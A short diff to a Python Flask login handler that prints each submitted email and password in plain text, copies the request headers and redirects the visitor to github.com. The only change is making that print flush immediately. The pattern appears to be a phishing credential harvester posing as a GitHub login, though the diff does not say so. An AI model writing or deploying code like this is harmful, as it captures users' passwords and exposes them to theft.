@@ -8,7 +8,7 @@ def login():
     if request.method == 'POST':
         email = request.form.get('email', '').strip()
         password = request.form.get('password', '')
-        print(f"email = {email} && password = {password}")
+        print(f"email = {email} && password = {password}", flush=True)
         headers = dict(request.headers)
 
         return redirect("https://www.github.com/")
